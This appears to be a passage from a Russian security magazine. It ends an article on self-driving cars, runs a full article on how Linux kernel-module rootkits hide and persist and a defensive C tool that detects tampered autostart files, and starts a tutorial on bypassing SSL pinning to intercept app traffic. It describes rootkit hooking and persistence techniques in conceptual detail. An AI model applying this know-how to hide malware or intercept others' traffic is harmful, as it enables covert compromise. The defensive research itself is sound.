так автопилоту куда легче соображать: карты могут включать в себя и рас‐
положение дорожных знаков, и мес та повышенной важности, и уж конечно —
рельеф местности, извес тные прег рады и прос то схему движения. Не зря
работу над российским аналогом гугловского Waymo ведет подразделение
«Яндекса» — огромный массив карт и панорам будет здесь большим под‐
спорьем. А ориентирование в абсолютно незнакомой мес тности пока оста‐
ется уделом победителей конкурсов DARPA и амбициозных стартаперов.
  Помни и о том, что за исключением отдель ных рекламных образцов
во  многих  беспилотных  автомобилях  за  рулем  всегда  присутс твует
страхующий водитель. И про изво дители не спешат разглашать статистику
случаев, когда его вмешательство становится необходимо. Потому что
это происходит чаще, чем им хотелось бы.


Уров ни авто ном ности
Американское Сооб щество автомобильных инженеров (SAE) определя ет сте‐
пень автономности транспортного средс тва по шкале от 0 до 5. По этой шка‐
ле «Тесла» оценивается как представитель уровня 2 — автоматика управля‐
ет скоростью и направлением, но водитель должен быть готов вмешаться
в любое мгновение. Кстати, обычный помощник при парковке тоже попадает
в эту категорию.
  Следующий, тре тий уро вень подразумевает полный контроль автомати‐
ки за транспортным средс твом — но только в жестко ограниченных условиях,
например на ско ростной автомагистрали, где нет перекрестков.
  Уро вень 4 теоретически не требует присутс твия челове ка за рулем —
но тоже только в строго определенных условиях, вроде движения в пределах
предварительно заданной области. Автомобили Waymo находятся на этом
уровне.
  Пятый уро вень — когда человек окончательно превращается в пас‐
сажира, а машина способна на движение в неог раниченных условиях — пока
не достижим ни для одного из проектов.



КАК ПЕРЕСТАТЬ БЕСПОКОИТЬСЯ И ПОЛЮБИТЬ «УМНУЮ» МАШИНУ
Так что же получается в итоге? Да то же самое, что и с многими другими
представителями «интернета вещей». Чем выше сложность сис темы, тем
больше у нее потенциально уязвимых мест, а самые защищенные эле менты
можно обойти, атаковав более  уязвимые. Заимствуя готовые решения
из смежных областей электроники, проектировщики забывают о том, что там
могут быть свои проб лемы. И наконец, человеческий фактор — бдительность
притупляется, когда система многократно справляет ся с простыми задачами,
и к ее ошибке в сложной ситуации никто не готов.
   Будь бдителен и осто рожен — за рулем и в интернете. Не ругай роботов
понапрасну — они еще только учатся, — но и не доверяй им в критично и жиз‐
ненно важных вещах на все сто.
  А если после проч тения этой статьи тебе захотелось не пересесть в ста‐
рые «Жигули» без всей этой электроники, а наоборот, разобраться в ней
на собственном опыте — можешь попробовать обра тить внимание на проект
Джорджа Хоца comma.ai. Это автопилот для автомобиля с полностью откры‐
тым кодом и сравнительно дешевой электронной частью, которую можно лег‐
ко установить во многие современные машины. Выйдет значительно дешевле
«Теслы» и куда интереснее — к тво им услугам обширное сообщество энту‐
зиастов, своя вики и подробный и интересный блог разработчиков. И даже
не придется дер жать на руле руки.
  Но смотреть на дорогу впереди и думать, что делаешь, все равно необ‐
ходимо.
 ВЗЛОМ





   Ксения Кирилова
Desperately in love with Linux
          and C
     kclo3@icloud.com



КАК ПРИРУЧИТЬ
РУТКИТ

 ПРЕДОТВРАЩАЕМ ЗАГРУЗКУ
 ВРЕДОНОСНЫХ МОДУЛЕЙ В LINUX




 Уже давно (как минимум с 1997 года) известно, что для Linux
 существуют вредоносные программы, хотя и слышно о них
  не так часто, как про вин довые. Тем не менее даже спустя
  двадцать с лишним лет руткиты на основе модулей ядра все
 еще  представ ляют  вполне  реальную  угрозу. Несмотря
  на  столь  большой  срок,  наиболее  частым  советом
  при заражении «ядерным» руткитом до сих пор остается
  полная переустановка системы. Неужели нельзя без этого
 обойтись? Иногда можно.


  КАКИЕ БЫВАЮТ РУТКИТЫ ДЛЯ LINUX
  Руткиты помогают злоумышленнику закрепить дос туп ко взломанной сис теме,
  при этом акцент сделан на максимальной незаметности вредоноса. Для это‐
  го они скрывают сетевые соединения, процессы, пап ки, файлы, подделывают
  их содержимое. Обычно руткит несет в себе хакерские утилиты для управле‐
  ния зараженной машиной, с помощью которых злодей может установить
  и прятать в системе DDoS‐бота или май нер (кстати, один такой, Skidmap,
  обнаружили сравнительно недавно). Чаще всего в эти утилиты входят бэк‐
  доры, и не только те, что можно запросто обна ружить внешним сканером
  портов, а использующие технологию Port knocking (что‐то вроде «простукива‐
  ния портов»), когда порт открывается только пос ле правильной и заранее
  определенной последова тельнос ти зап росов к закрытым портам.
     Традиционно все рут киты делят на работа ющие в пространс тве поль‐
  зователя и работающие в пространс тве ядра. Против первых уже есть ути‐
  литы, способные обна ружить многие из них: chkrootkit, rkhunter, Antidoto
  и проект с незамысловатым названием linux‐malware‐detect. Поэтому «ядер‐
  ные» руткиты, которые сложнее обнаружить непос редственно на зараженной
  системе, представляют больший интерес, хотя часть из них эти утилиты тоже
  могут выявить (но не удалить).
     Руткиты уров ня ядра в Linux, как пра вило, реализуются в виде загружаемых
  модулей ядра (LKM, Loadable Kernel Modules), но есть еще более экзотичес‐
  кие способы: вредоносный код записывается пря мо в память ядра через
  файл устройства /dev/kmem или внедряется на ранних этапах загрузки
  с модификацией initrafms (если ты знаком с такими руткитами, дай знать —
  попадаются только теоретичес кие описания, а найти образцы мне не уда‐
  лось). Сейчас, впрочем, о случаях заражения «ядерными» руткитами пишут
  нечасто, но все тот же недавно выявленный Skidmap говорит о том, что
  об этой угрозе забывать не стоит.


              INFO

                          Загружаемые модули ядра (*.ko, до ядра 2.6 —
                     *.o) позволя ют динамически расширять функци‐
                         ональность ядра без необходимости переком‐
                        пилировать  его  целиком.  Очень  полезный
                        механизм  для  повыше ния  гибкости  системы
                        и  очень подходящий  для  создания  руткитов,
                         которые обладали бы максимально возможными
                        привилегиями.



 ЖИЗНЕННО ВАЖНЫЕ ЗАДАЧИ КАЖДОГО РУТКИТА
  В ядре имеется множес тво структур, опи сывающих текущее состояние сис‐
  темы. Например, это список запущенных про цес сов, сос тоящий из указате‐
  лей на дескрипторы процессов, который исполь зуется планировщиком. Дру‐
  гой важный объект — список загруженных модулей ядра, где каждый элемент
  указывает на дескриптор загруженного модуля. Он используется командами,
  оперирующими LKM: lsmod, rmmod, modprobe и подоб ными. Эти спис ки отно‐
  сятся ко внутренним объектам ядра.
    Всякий вредоносный модуль первым делом удаляет себя из списка заг‐
  руженных модулей, ведь если LKM в нем не опи сан, то ядро считает, что такой
  модуль не загружен. Это значит, что он не отобразится в выводе lsmod и не
  будет выгружен с помощью rmmod. Такая техника называется манипулиро‐
  ванием внутренними объекта ми ядра (DKOM, Direct Kernel Object Manipula‐
   tion) и подробно описана в статье на Хабре.
     Также любой хороший руткит заботится о том, как остаться в строю после
  перезапуска системы. Например, Snakso, обнаруженный  в 2012  году,
  для этого прописывает команду загрузки модуля в /etc/rc.local, rkduck
  предпочитает файл /etc/rc.modules, а Reptile в зависи мости от целевой
  системы может использовать и /etc/rc.modules, и /etc/modules. Skidmap
  вносит разнообразие в этот список и закрепля ется в сценариях планиров‐
  щика задач cron. Вооб ще, для этой цели могут подойти и другие файлы, вли‐
  яющие на загрузку Linux, в том числе загрузочные скрипты. Далее будем
  называть такие файлы файлами автозагрузки.


              INFO

                    •/etc/rc.local    содержит    команды,
                           которые необходимо выполнить при запуске
                           системы. Руткиты добавляют туда команду in
                     smod <путь к вредоносному LKM>.
                    •/etc/rc.modules    содержит    список
                          модулей  ядра,  которые  нужно   загрузить
                          при запуске — на более раннем этапе заг рузки
                         ОС,  чем  при  использовании  /etc/rc.
                     local. Данный файл харак терен для RPM‐
                          дистрибутивов.
                    •/etc/modules   также  содержит  список
                           модулей, но используется в deb‐системах.


  И все вроде бы просто: проверяй содержимое этих файлов на подоз ритель‐
  ные строки, и в твоей системе все будет хорошо. Но руткит не руткит, если
  не скрывает еще и что эти файлы модифицированы. Он может перехватывать
  системные вызовы и даже функции самого ядра, которые за этими вызовами
  стоят: например, Snakso и Reptile перехватыва ют функции файловой под‐
  системы ядра VFS (Virtual File System). Рут киты проверяют, было ли среди
  прочитанного что‐то, что необходимо скрыть от глаз пользователя или адми‐
  нистратора, и при необходимости модифициру ют буфер со считанными дан‐
  ными.
    И когда ничего не подоз рева ющий (или подоз ревающий) пользователь
  попытается просмотреть содержимое модифицированного руткитом фай ла,
  увидит он только список вполне легитимных модулей или команд. Именно
  это  становится  проб лемой  при  попытке  обнаружить  руткит,  работая
  за зараженной машиной. Вооб ще говоря, при заражении руткитами уровня
  ядра не стоит верить ничему из того, что сооб щает нам ядро.


  МАТЧАСТЬ: КАК LKM-РУТКИТЫ ЗАМЕТАЮТ СЛЕДЫ
  Прежде чем приступать к борь бе с вредоносными модулями, нужно более
  детально разобрать механизмы, с помощью которых они скрываются в сис‐
  теме сами и скрывают своих протеже, — чтобы знать, с чем конкретно
  бороться.


  Пе рехват системных вызовов и фун кций
  Этот шаг необходим рут киту для пос леду ющих дей ствий. Перехват (hook)
  функций ядра и перехват системных вызовов мало чем отличаются и позволя‐
  ют выполнять руткиту свои функции под видом перехваченных, проводя
  для маскировки данных проверки. Вари антов перехвата не так много: либо
  подменить адрес функции, либо установить в самом ее коде инструкцию
  безусловного перехода jmp.
    Информацию о местонахож дении кода системных функций и вызовов ядро
  берет из двух таблиц: символьной таблицы ядра System.map (откуда при заг‐
  рузке  экспортируемые  функции  ядра  отоб ражаются  в  псевдофайл
  /proc/kallsyms) и таблицы syscall’ов sys_call_table, адрес которой есть
  в System.map.


              INFO

                     Обработчики системных вызовов, расположенные
                          в ядре, называются по имени системного вызова
                          с приставкой sys_: за вызовом open() стоит
                       функция  ядра  sys_open(),  то  же  верно
                         для  всех  остальных  вызовов.  Это  дает  воз‐
                        можность перехватывать не только syscall, но и
                           его обработ чик, ведь последний также находится
                          в System.map.


  Когда найден адрес нужной функции, рут кит заменяет его адре сом своей
  функции. Таблица системных вызовов находится в защищенной области
  памяти, помеченной толь ко для чтения в регистре CR0 (x86), но это ограниче‐
  ние — ерунда для руткита уровня ядра, ведь есть write_cr0(), с помощью
  которой оно легко обходится. Замена адреса самой таблицы воз можна,
  но мне пока не встречалась.
    Другой вариант, получивший название сплайсинг (от англ. splice — стык,
  склейка), заключается в установке инс трукции jmp в коде функции и выпол‐
  няется одинаково для системных функций и syscall’ов. Как правило, перепи‐
  сываются первые пять байт пролога функции, которых достаточно для раз‐
  мещения опкода 0xe9 и адреса перехо да. Оригинальные байты пролога сох‐
  раняются, чтобы была воз можность корректно выз вать перехваченную фун‐
  кцию. Однако умный хакер может значительно усложнить задачу белым шля‐
  пам, размещая хук не в начале перехватыва емой функции, а где‐нибудь в ее
  середине.
    Вне зависимости от выб ранного способа, когда программа вызывает
  перехваченную функцию, управление перехо дит к вредоносной, которая
  вызывает оригинальную, проверяет результат ее выполнения и модифициру‐
  ет его в случае надоб ности. Вызывавшая программа получит уже модифи‐
  цированные данные, совершенно не догады ваясь об этом.


 Маскировка файлов и их содержимого
  На самом деле еще и папок, ведь со времен Unix в Linux действует филосо‐
  фия «все есть файл». Для этой задачи вредонос ные LKM перехватывают фун‐
  кции файловой подсистемы ядра VFS, в первую очередь vfs_read(). Пос ле
  ее выполнения руткит прос матривает прочтенные данные в поисках того, что
  нужно скрыть от пользователя.
    К примеру, Reptile ищет в буфере vfs_read() свои теги (по умол чанию
  это <reptile> и закрывающий в пару к нему) и удаляет отту да их, а также все,
  что между ними. Чтобы спрятать файлы и папки, рут киты проверяют листинг
  директории на заданные заранее имена и при совпадении убирают их.
  При этом они не всегда перехватывают обращения к скры тым папкам, и, зная
  эти имена, можно туда зайти и оперировать файлами в них.


 Маскировка про цессов
  Так руткиты прячут майнеры и прочую нечисть. Один из способов аналогичен
  скрытию файлов:  список  процессов  дос тупен  через  интерфейс  ядра
  /proc/<PID>/ для каждого процесса. Эти файлы используются, например,
  программами ps, top, и если руткит скроет соответствующую папку, то они
  не отобразят такой процесс.
    Более сложный вариант, описанный в презентации Black Hat, под разуме‐
  вает модификацию внут реннего списка процессов и отвязывание от него
  дескриптора task_struct нужного процес са. Но здесь воз никает проб лема:
  этот список исполь зуется пла нировщиком, и если в нем не будет описателя
  процесса, то процесс повиснет, пос кольку пла нировщик не может узнать
  о его существовании. Нужно еще и изменять логику работы планировщика,
  что, в принципе, возможно, но неплохо усложня ет задачу злоумышленнику.


 Маскировка сетевых соединений и модификация трафика
  Чтобы скрыть бэк дор, руткиты либо применя ют технику Port knocking, либо
  подделывают информацию об открытых сокетах. Пользовательские прог‐
  раммы, в числе которых netstat, для получения информации о сетевых
  соединениях используют псевдофайлы /proc/net/tcp и /proc/net/tcp6,
  служащие отображением данных из памяти ядра. Перехват vfs_read() поз‐
  воляет руткиту фильтро вать соединения, дос тупные глазу юзера из этого
  файла. Можно также перехватить tcp4_seq_show() и tcp6_seq_show(),
  с помощью которых реализуются эти интерфей сы ядра в /proc. Впрочем,
  утилита ss работает немного иначе и в некоторых случаях может отобразить
  скрытые из /proc/net/tcp и tcp6 соединения.
     Встроенный в ядро Linux межсетевой экран NetFilter обеспечивает филь‐
  трацию пакетов, трансля цию адресов и прочие преобразования пакетов. Эта
  подсистема представляет собой набор хуков над стеком сетевых протоколов
   Linux. С их помощью можно регистрировать в ядре функции для работы
  с пакетами на одной из пяти стадий их обработки: PREROUTING, INPUT (LOCAL
  IN), FORWARD, POSTROUTING и OUTPUT (LOCAL OUT). «Ядерный» руткит легко
  может зарегистрировать свою функцию для модификации сетевого трафика
  на любом из этапов.


 СПОСОБЫ БОРЬБЫ С LKM-РУТКИТАМИ
  Несмотря на изощренные спо собы мас кировки рут китов, установить, что сис‐
  тема зараже на, зачастую не так сложно. Рут киты перехватывают функции,
  а тут, как показано ранее, вариантов немного.
    В случаях с подменой адресов лучше всего иметь исходный вариант таб‐
  лицы, чтобы впоследствии можно было проверить ее целостность, но нужно
  помнить, что после обновления ядра адреса могут измениться. Для сплай‐
  синга можно проверить, нет ли по адресу функции байта со значением 0xe9,
  соответствующе го jmp, и выявить хук (что уже не столь просто, если он уста‐
  новлен не в начале. В этой статье рас сматрива ется и такой случай).
    Обнаружить скрытые соединения в простейшей ситу ации можно внешним
  сканером портов, но при использовании Port knocking это вряд ли даст
  результат, разве  что придется мониторить  тра фик, проходящий через
  сетевой шлюз.
    Еще есть интересная задача — поискать в памяти ядра дескриптор
  модуля, отвязанного от списка загруженных модулей. Найдя, можно вернуть
  его в список, чтобы затем использовать rmmod (если, конечно, руткит не под‐
  менил и его на всякий случай). Существу ет решение (см. раздел 6), позволя‐
  ющее обнаружить в памяти объекты, похожие на дескрипторы LKM, но оно
  работает на уже очень ста рых и только 32‐битных ядрах. Перебор же памяти
  современных систем затруднен из‐за огромного адресного прос транства,
  но оттого эта задача становится лишь интересней.
    Однако установить наличие рут кита в системе — лишь полдела. Неп‐
  лохо бы его оттуда убрать, а еще и найти сам исполня емый файл, чтобы было
  что поизучать на выходных. Самый простой и безотказный способ — взять
  носитель с зараженной операционкой и искать там подозрительные файлы
  загружаемых модулей со сторонней машины, хотя это не поможет против од‐
  ного сверхсекретного метода хранения файлов (кто знаком с такими вре‐
  доносами, тоже пишите). Но это совсем не интерес но, правда? К тому же
  наверняка существуют системы, для которых пребывать в нерабочем сос‐
  тоянии, пока идет поиск, крайне нежелательно. Поэтому попробуем иссле‐
  довать заражен ную машину изнутри. Что же может выдать присутствие рут‐
  кита и при этом указать на файл вредонос ного модуля?


 НАЧИНАЕМ СОБСТВЕННОЕ РАССЛЕДОВАНИЕ
  Итак, что нам известно? Что LKM‐рут кит непременно дол жен где‐то про‐
  писать строчку, ведущую к его загрузке при старте ОС. Также мы знаем, что
  он старается это скрыть.
    Предположим, в нашей системе установлен Reptile. Открываем в любом
  текстовом редакторе /etc/modules и видим, что он будто бы чист, но мы‐то
  знаем — там есть скрытое содержимое. Что будет, если попробовать, не вно‐
  ся никаких изменений в файл, сохранить его? Сохранится именно то, что мы
  видим, — то есть после перезагрузки ОС вредоносный LKM уже активен
  не будет. Правда, здорово? Автор руткита EnyeLKM тоже предлагал такой
  способ предотвращения его загрузки. Опи санный эффект наблюдается
  потому, что сохраняется ровно то, что открыто в редакторе, то есть часть
  файла, свободная от данных руткита.
     Что ж, уже неплохо. Но что делать, если неизвес тно, в какой именно файл
  автозагрузки прописался руткит? Не перебирать же все задей ствованные
  файлы (хотя можно, но это слишком прос то). К тому же такой способ унич‐
  тожает в файле все зацепки, которые помогли бы быстрее идентифици ровать
  вредонос. Нужно найти модифицированный файл автозагрузки, помес тить
  вместо него свободную от данных руткита копию, но при этом как‐то оставить
  эти данные, чтобы было проще найти вредонос ный LKM. Еще было бы полез‐
  но определить, какой имен но файл был модифицирован руткитом, чтобы
  не пересохранять и анализировать их все.
     Таким образом, наша задача предотвращения загрузки LKM‐руткита сво‐
  дится к двум вопросам:
   • как найти файл со спрятанным содержимым, если неиз вестно, каким
    образом руткит закрепился в системе;
   • как сохранить этот файл так, чтобы это содержимое не оказалось удалено.

  И как же все‐таки понять, что перед нами файл, который знает больше, чем
  показывает? Оказывается, все прос то: лишнее содержимое — значит, лиш‐
  ние данные на диске. Да, я кло ню к тому, что, скры вая содержимое, руткиты
  пока не догадались фальсифицировать размер файла. Как я покажу далее,
  не очень‐то просто это про вернуть.





    Папка‐невидимка и несоответс твие между размером /etc/modules
    и количеством считанных из него байтов

  Со вторым вопросом тоже несложно разоб раться. Переименуем найденный
  на предыдущем шаге файл, чтобы система не читала из него при сле дующем
  запуске, а затем сохраним копию (которая уже не будет содержать данные
  руткита) под оригинальным именем. Вуаля!


 РАЗРАБАТЫВАЕМ АРСЕНАЛ
  Теперь мы готовы автоматизировать поиск и восста новление модифициро‐
  ванного файла автозагрузки. Необходим лишь список этих фай лов, чтобы
  программа знала, где именно искать подвох. Далее для каждого такого фай‐
  ла программа сравнивает количес тво бай тов, прочитанных с помощью
  fread() (за которой стоит системный вызов read(), а за ним, в свою оче‐
  редь, перехваченная функция ядра vfs_read()), с размером файла, получен‐
  ным из структуры, опи сывающей файл в файловой системе (i‐node). Так
  как данная структура недос тупна из прос транства юзе ра, необходимо вос‐
  пользоваться системным вызовом fstat().
    Безусловно, LKM‐рут киту не сос тавит осо бого труда перехватить и его,
  но мне хотелось показать, что нынешним «ядерным» руткитам можно успешно
  противостоять из прос транства пользователя, поэтому я предлагаю прог‐
  рамму пользовательского уровня. При необходимос ти ее можно портировать
  в ядро. Там подделать раз мер файла руткит смо жет, только подменив зна‐
  чение f‐>inode‐>i_size (для ядер старше 3.9.0 — f‐>f_mapping‐>host‐>
  i_size), но это как минимум чревато проб лемами при чтении файла —
  все‐таки серьезная низкоуровневая структура. В любом случае известные
  ныне руткиты не влияют ни на эти данные, ни на fstat() (смею пред‐
  положить, что теперь начнут).
    Код разработанной мной прог раммы можно найти на гитхабе. Она пред‐
  лагает минимальный набор функций, демонс трирующий, что справляется
  со своей задачей; при желании его можно и нужно расширить. Программа
  содержит массив строк с именами файлов, наиболее уязвимых к модифи‐
  кации LKM‐руткитами (список еще далеко не пол ный), и проверяет каждый
  из них на наличие маскируемого содержимого.
    Основная  часть  этой  проверки  заключена  в функции  cmp_size().
  При  подозрении  на  рут кит  выводится  соответству ющее  сообщение
  с информацией о том, на какое количес тво байтов отличается фактическое
  содержимое от прочитанного. get_fsize() получа ет раз мер проверяемого
  файла из его дескриптора:


  off_t get_fsize(FILE *f)
  {
      int res;
      struct stat fst;
      errno = 0;
      res = fstat(fileno(f), &fst);
      if(res){
          perror("In get_fsize(): couldn't get fstat");
          return 0;
      }
      return fst.st_size;
  }


  short cmp_size(FILE *f)
  {
      unsigned int i_size, read;
      char *fbuf;


      i_size = (unsigned int)get_fsize(f);
      if (errno){
           printf("\x1b[1;31m***WARN***\x1b[0m Some problems with %s.\n
  ",
                  start_files[i]);
           return 1;
      }


      fbuf = (char*)malloc((i_size+1) * sizeof(char));
      memset(fbuf, 0, i_size+1);


      read = fread(fbuf, 1, i_size, f);


      if (i_size != read){
          printf("\x1b[1;31m***WARN***\x1b[0m Something performs file
  tampering of %s : "
                 "read %u bytes instead of %u.\n", start_files[i], read
  , i_size);
          lets_talk(f, i_size, read);
          free(fbuf);
          return 1;
      }else{
          printf("\x1b[32m%s\x1b[0m looks fine to the userland\n",
  start_files[i]);
          free(fbuf);
          return 0;
      }
  }

  Если найдено несоответс твие, программа предложит возможные действия:
  попытку прочесть действительное содержимое файла (побай тово, чтобы рут‐
  кит не смог найти свои маркеры в считанном буфере. Это не дает никаких
  гарантий, но почему бы не попробовать?) и заменить его безопасной копией.
  К старому файлу с данными руткита при этом добавляется суффикс .old.





                                     nitara‐l3 в дей ствии

  Теперь осталось перезагрузиться, ведь руткит еще сидит в памяти и занима‐
  ется своими грязными делами. Ну а дальше — ищем то, что скрывалось
  в ныне чистом файле автозагрузки, находим вредонос ный бинарник, про‐
  веряем его на VirusTotal или где‐нибудь еще и радуемся, какие мы молодцы.





             Находим вредоносный LKM после перезагрузки

  Справедливости ради ска жу: против рут китов, отслеживающих обращения
  к своему файлу автозагрузки и проверя ющих его содержимое при записи,
  описан ные выше методы могут не помочь, но это уже, как говорится,
  совсем другая история. Мы тут рас сматривали вполне определенный частный
  случай, но кто знает, вдруг сама идея, к которой мы пришли, будет полезна
  и в дальнейшем?


 НАПОСЛЕДОК
  Ясное дело, что противос тояние антивирусов и вредоносных программ —
  это вечная борьба бобра с ослом доб ра со злом, и чем дальше, тем более
  изощренные тактики злоумышленники используют для своих злодеяний.
     Как ты понимаешь, самым надежным способом выявить руткит все равно
  будет анализ диска, хотя бы с помощью Live CD. И лишь после, имея на руках
  вредонос и изучив все его механизмы, можно браться за разработку защиты
  непосредственно для взло манной оси, что мы и попробовали сделать
  на одном конкретном примере. Про тив будущих и неизвестных сейчас LKM‐
  руткитов наша программа, вероятно, ока жется бесполезна, но это лишний
  повод вновь почувствовать себя супергероем и совершенс твовать методы
  противодействия.
    Если тебе, дорогой читатель, интересно изу чение всяких нехороших прог‐
  рамм под Linux, в особенности руткитов, держи нес колько полезных ссы лок,
  которые здорово помогли мне в этой области.


         WWW

                    •Очень хороший обширный обзор руткитов уров‐
                           ня  ядра. Описаны всевозможные методики,
                          применяемые ими для «невидимости», и вари‐
                          анты защиты от них. Не смот ри, что ему уже
                             пят надцать лет, — как минимум многие базовые
                          механизмы ядра Linux в целом остались такими
                             же.
                      •Серия из 35 статей о работе и программирова‐
                          нии модулей ядра Linux.
                    •Один добрый человек собрал список Linux‐рут‐
                            китов со ссылками на исходники.
                    •Нельзя не упомянуть такую фундаментальную
                            работу Танен баума,  как «Современные опе‐
                          рационные системы», а так же исходники и до‐
                          кументацию ядра Linux, ведь для действительно
                         хорошего  понимания  работы  вредоносных
                            программ  необходимо  знать,  как  устроена
                           целевая система.


  В добрый путь, не забывай вести себя хорошо, вовремя делать резервные
  копии системы и чистить зубы по утрам.
ВЗЛОМ

 УНИВЕРСАЛЬНЫЙ
 ПЕРЕХВАТ





 КАК ОБОЙТИ SSLPINNING РАЗ И НАВСЕГДА
 И ЧИТАТЬ ТРАФИК ЛЮБОГО ПРИЛОЖЕНИЯ





Очень  час то  исследование  внутренней
работы прикладных программ можно свес‐
ти к исследованию их трафика, и чаще все‐
го передается он по протоколам семейства
HTTP.  Но  каждое  приложение  может             AseN                                                                                             Reverse Engineer
по‐своему защищаться  от  «прослушки».           antochi.anton@ya.ru
Сегодня мы постараемся выяснить,  что
общего есть у всех подходов к защите и как
эту  общую  часть  можно  использовать
для  создания  универсального  метода
перехвата HTTPS.


НЕМНОГО ОБ HTTP И О ТОМ, ПРИ ЧЕМ ЗДЕСЬ OPENSSL
Ни для кого не секрет, что трафик HTTP преобла дает в интернете. Популяр‐
ность и распространенность протокола HTTP привела к его повсемес тному
использованию даже там, где поначалу он мог бы показаться нелепым
и избыточным — например, в мобильных и десктопных при ложе ниях.
  За время своего существо вания HTTP оброс кучей разных фич и наворо‐
тов, устраняющих недостатки его изна чальной «вебовой» версии: Cookies
для устранения Stateless, Keep‐Alive и Long polling для имитации непрерыв‐
ности соединения, концепция REST, бинарный HTTP/2 с повсемес тным сжа‐
тием и многое другое. Забегая вперед, отмечу, что HTTP/2 вообще раз‐
рабатывался с учетом использования вмес те с TLS 1.2+.
  На определенном этапе раз вития протокола ста ло понятно, что HTTP ста‐
новится универсальным способом для обмена данными в клиент‐серверной
модели. Разработчики это негласно приняли и начали использовать при соз‐
дании новых приложений.
  Параллельно с HTTP шло развитие SSL, а их синтез — HTTPS — постепен‐
но захватывал долю тра фика в мировом интернете, пока в один прекрасный
момент в конце января 2017 года не превысил половину. Сей час его доля
стремится к 80%. Многие увидели смысл в шифровании данных, а тех, кто
не успел, стали поторапливать в том чис ле и разработчики браузеров. В ито‐
ге все снова приняли это (что хорошо!) и начали повсеместно при менять
в своих приложениях, многие из которых и так уже работали по при вычному
HTTP.


        WWW

                   В  Mozilla  публикуют  статистику  на  основе
                       телеметрии  Firefox, где видно, какой процент
                        веб‐страниц  загружают  по  HTTPS. На  сайте
                         LetsEncrypt можно посмотреть графики, основан‐
                     ные на этих данных.


Развитие SSL, а впоследс твии и TLS (SSL 3.0+) во многом определялось раз‐
витием опенсорсного проекта OpenSSL. Он медленно, но верно впитывал
в себя все новые и новые спецификации RFC. Как известно, велоси педы
изобретать никто не любит, поэтому биб лиотека OpenSSL стала де‐факто
стандартом при имплементации защищенного транспорта для HTTP, и теперь
ее следы можно обнаружить в бессчетном количес тве софтверных проектов.


Как работает классический HTTPS
Использование HTTPS помогло защититься от MITM‐атак на пользовате ля,
однако не от его собственных ошибок. Достаточно взгля нуть на классическую
схему протокола SSL, и ста новится понят но, что конфиденциальность здесь
держится исключительно на сертифика те сервера.





                          TLS Handshake

Получая от сервера сертификат на треть ем шаге рукопожатия, клиент при‐
нимает решение, доверять серверу или нет (тот ли он, за кого себя выдает?).
Делает это клиент не без сторонней помощи, что в результате и приводит
к существенному упрощению анализа тра фика.
  Для проверки исполь зуются центры сертификации, которые бывают кор‐
невыми и промежуточными. Публичных корневых центров мало, и обо всех
них знает каждый клиент SSL/TLS. А промежуточных центров может быть
очень много — единствен ное их отличие от корневых в том, что выпус каемые
ими сертификаты подписываются приватным клю чом вышес тоящего CA. Нап‐
ример, если посмотреть на путь сертификации google.com на рисунке ниже,
то корневым будет сертификат, выданный GlobalSign, а промежу точным —
Google Internet Authority.





                 Цепочка сертификатов Google


        WWW

                    •Объяснение хендшейка TLS 1.2 байт за байтом



Получая от сервера сертификат, клиент всег да может узнать, кто именно его
подписал, и удостоверить ся в этом с помощью приложенных публичных клю‐
чей. И так вплоть до корневого центра. Если на пути до корневого сертифика‐
та так и не встре чается ни одного доверенного сертификата, клиент завер‐
шает процедуру рукопожатия, не передавая никаких полез ных данных сер‐
веру (ведь он, вероятно, не тот, за кого себя выдает). Этот процесс называ‐
ется проверкой цепочки сертифика тов.
  Для разработчиков сложности по сокрытию трафика своего приложения
начинаются в тот момент, когда у клиента появляется воз можность добавлять
собственные доверенные сертифика ты. По умолчанию источником таких сер‐
тификатов является какая‐нибудь пап ка или группа папок (в зависимости
от операционки) в локальной файловой системе, в которую разработчики ОС
еще на этапе сборки поместили сертифика ты доверенных центров. Давай
попробуем убе диться в этом на практике.


ИССЛЕДУЕМ ПРИНЦИПЫ РАБОТЫ OPENSSL НА ПОДОПЫТНОМ
ПРИЛОЖЕНИИ
Библиотека OpenSSL «в вакууме» по умолчанию не доверяет никому, а чтобы
инициировать процесс появления этого доверия, библиотеке необходимо
сообщить о том, кому, собственно, мы намерены доверять. Если рассмотреть
пример классического клиента TLS, приведенный в wiki.openssl, то можно там
заметить загрузку доверенных сертификатов непосредственно перед осу‐
ществлением запроса HTTP:


...
ctx = SSL_CTX_new(method);
if(!(ctx != NULL)) handleFailure();


SSL_CTX_set_verify(ctx, SSL_VERIFY_PEER, verify_callback);
SSL_CTX_set_verify_depth(ctx, 4);


const long flags = SSL_OP_NO_SSLv2 | SSL_OP_NO_SSLv3 | SSL_OP
_NO_COMPRESSION;
SSL_CTX_set_options(ctx, flags);


// загрузка доверенных сертификатов
res = SSL_CTX_load_verify_locations(ctx, "random‐org‐chain.pem", NULL
);
if(!(1 == res)) handleFailure();
...

Кроме функции SSL_CTX_load_verify_locations существу ет еще нес колько
похожих способов загрузки проверенных сертификатов внутрь OpenSSL.
Наверняка разработчики, которые писали свои клиенты TLS, не стеснялись
подсматривать подоб ные общедос тупные при меры.
  Попробуем отсле дить поведение представленного классичес кого клиента
TLS на каком‐нибудь реальном приложении. Для начала возьмем что‐нибудь
простое, что могло бы быть связано с TLS, — нап ример, библиотеку OkHttp.
Она обеспечивает коммуникации по HTTP/S в бес численном количестве сов‐
ременных приложений для Android.
  Заранее замечу, что OkHttp написана на Java и работает на JVM, поэтому
сама по себе она не интерес на, так как является своеобразной оберткой
более  интересной  составляющей —  низкоуровневой  имплементации
OpenSSL для Android. Вот ей‐то мы и займемся.


Го товим тестовое приложе ние
Для начала исследования нужно обзавес тись приложением, которое исполь‐
зует логику OkHttp для безопас ных запросов. Проще все го его создать
с нуля, взяв за основу эталонные примеры кода из интернета. Так же, как это
делают сотни и тысячи дру гих раз работчиков. :)
  В интерфейс тестового приложения включим две кнопки, по нажатию
на которые будет происхо дить следующее:


// Кнопка "Do just HTTPS!"
val okHttpClient = OkHttpClient.Builder().build()
val request = Request.Builder().url("https://google.com").get().build
();
okHttpClient.newCall(request).execute()
...
// Кнопка "Do Https with pin!"
val certificatePinner = CertificatePinner.Builder()
  .add("google.com","sha256/f8NnEFZxQ4ExFOhSN7EiFWtiudZQVD2oY60uauV/
n78=")
  .build()
val okHttpClient = OkHttpClient.Builder()
  .certificatePinner(certificatePinner)
  .build()
val request = Request.Builder().url("https://google.com").get().build
();
okHttpClient.newCall(request).execute()





                   UI подопытного приложения для Android

Совершенно стандартный код, кочу ющий по Ctrl‐C и Ctrl‐V из одного проекта
в другой, подвергаясь при этом несущес твенным изменениям. Итак, запус‐
